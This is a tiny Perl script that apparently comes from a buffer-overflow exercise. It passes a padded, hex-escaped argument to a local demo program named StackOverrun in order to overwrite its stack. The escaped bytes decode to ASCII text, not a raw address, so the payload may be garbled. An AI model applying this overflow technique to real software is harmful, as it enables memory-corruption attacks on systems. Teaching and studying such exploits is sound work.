$arg = "AAAAAAAAAAAA"."\x30\x62\x64\x30\x30\x30\x30\x30\x31\x78\x30";
$cmd = "./StackOverrun ".$arg;

print $cmd;
system($cmd);

